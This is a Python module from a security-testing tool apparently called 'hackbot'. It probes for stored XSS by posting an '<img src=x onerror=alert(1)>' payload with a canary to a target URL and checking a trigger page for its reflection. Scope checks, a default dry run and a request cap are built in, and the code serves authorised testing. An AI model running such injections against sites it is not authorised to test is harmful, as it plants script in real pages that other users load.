"""Capped second-order / stored XSS: inject canary then hit a trigger URL."""

from __future__ import annotations

import json
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from .base import RunnerResult, require_in_scope

CANARY = "hackbotSOXSS1337"
STORE_PROBE = f'<img src=x onerror=alert(1)>{CANARY}'


def second_order_xss(
    target_dir: Path,
    store_url: str,
    *,
    trigger_url: str = "",
    param: str = "comment",
    method: str = "POST",
    approve: bool = False,
    force: bool = False,
    timeout: float = 12.0,
    session: str = "",
) -> RunnerResult:
    """
    Cap: 1 store request + 1 trigger GET. Never unbounded crawl.
    Signal if canary appears on trigger page after inject.
    """
    require_in_scope(target_dir, store_url, action="second-order xss store", force=force)
    trigger = trigger_url or store_url
    require_in_scope(target_dir, trigger, action="second-order xss trigger", force=force)
    plan = {
        "store_url": store_url,
        "trigger_url": trigger,
        "param": param,
        "method": method.upper(),
        "canary": CANARY,
        "approve": approve,
        "capped": True,
    }
    ui.code_panel(json.dumps(plan, indent=2), title="second_order_xss", lexer="json")
    cmd = ["second_order_xss", store_url, trigger]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(cmd, False, None, json.dumps({"dry_run": True, **plan}), "", "dry-run")

    headers = {"User-Agent": "hackbot-second-order-xss", "Content-Type": "application/x-www-form-urlencoded"}
    if session:
        try:
            from ..identity import load_identity

            auth = load_identity(target_dir).merge_headers(session)
            headers.update(auth)
        except Exception:  # noqa: BLE001
            pass

    # Store
    store_status = 0
    try:
        body = urllib.parse.urlencode({param: STORE_PROBE}).encode("utf-8")
        req = urllib.request.Request(
            store_url if "://" in store_url else f"https://{store_url}",
            data=body if method.upper() != "GET" else None,
            method=method.upper() if method.upper() != "GET" else "GET",
            headers=headers,
        )
        if method.upper() == "GET":
            parsed = urllib.parse.urlparse(store_url if "://" in store_url else f"https://{store_url}")
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [STORE_PROBE]
            probe = urllib.parse.urlunparse(
                (
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    "",
                    urllib.parse.urlencode({k: v[0] if v else "" for k, v in qs.items()}),
                    "",
                )
            )
            req = urllib.request.Request(probe, method="GET", headers={"User-Agent": headers["User-Agent"]})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            store_status = int(getattr(resp, "status", None) or resp.getcode())
            resp.read(50_000)
    except urllib.error.HTTPError as exc:
        store_status = int(exc.code)
    except Exception as exc:  # noqa: BLE001
        return RunnerResult(
            cmd,
            True,
            1,
            json.dumps({"ok": False, "signal": False, "error": f"{type(exc).__name__}: {exc}"}),
            "",
            "error",
        )

    # Trigger
    trigger_status = 0
    reflected = False
    preview = ""
    try:
        treq = urllib.request.Request(
            trigger if "://" in trigger else f"https://{trigger}",
            method="GET",
            headers={"User-Agent": "hackbot-second-order-xss"},
        )
        with urllib.request.urlopen(treq, timeout=timeout) as resp:
            trigger_status = int(getattr(resp, "status", None) or resp.getcode())
            body_t = resp.read(120_000).decode("utf-8", errors="replace")
            reflected = CANARY in body_t
            preview = redact_text(body_t[:240])
    except urllib.error.HTTPError as exc:
        trigger_status = int(exc.code)
        body_t = exc.read(60_000).decode("utf-8", errors="replace") if exc.fp else ""
        reflected = CANARY in body_t
        preview = redact_text(body_t[:240])
    except Exception as exc:  # noqa: BLE001
        return RunnerResult(
            cmd,
            True,
            1,
            json.dumps({"ok": False, "signal": False, "store_status": store_status, "error": type(exc).__name__}),
            "",
            "error",
        )

    out: dict[str, Any] = {
        "ok": True,
        "signal": reflected,
        "reason": "stored canary on trigger" if reflected else "no stored reflection",
        "store_status": store_status,
        "trigger_status": trigger_status,
        "canary": CANARY,
        "preview": preview,
    }
    return RunnerResult(cmd, True, 0, json.dumps(out), "", "executed")
